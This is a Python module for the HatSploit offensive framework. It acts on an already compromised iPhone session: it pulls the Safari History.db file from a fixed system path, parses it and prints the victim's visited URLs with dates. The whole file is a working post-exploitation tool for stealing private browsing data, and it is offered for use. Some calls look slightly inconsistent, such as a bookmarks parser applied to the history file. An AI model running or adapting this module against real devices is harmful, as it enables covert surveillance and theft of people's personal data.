#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module

from hatsploit.utils.session import SessionTools
from hatsploit.utils.db import DBTools


class HatSploitModule(Module, SessionTools, DBTools):
    details = {
        'Name': "Obtain Safari history",
        'Module': "post/iphoneos/shell/safari_history",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Get iPhoneOS Safari history database and parse it.",
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Rank': "medium"
    }

    options = {
        'SESSION': {
            'Description': "Session to run on.",
            'Value': None,
            'Type': "session",
            'Required': True
        }
    }

    def run(self):
        session = self.parse_options(self.options)

        history_path = '/private/var/mobile/Library/Safari/History.db'
        local_path = self.session_download(session, history_path)

        if local_path:
            self.print_process("Parsing history database...")

            try:
                history = self.parse_safari_bookmarks(local_path + 'History.db')
            except Exception:
                self.print_error("Failed to parse history database!")
                return

            history_data = []
            for item in history:
                history_data.append((item['date'], item['details']['url']))

            if history_data:
                self.print_table("History", ('Date', 'URL'), *history_data)
            else:
                self.print_warning("No history available on device.")
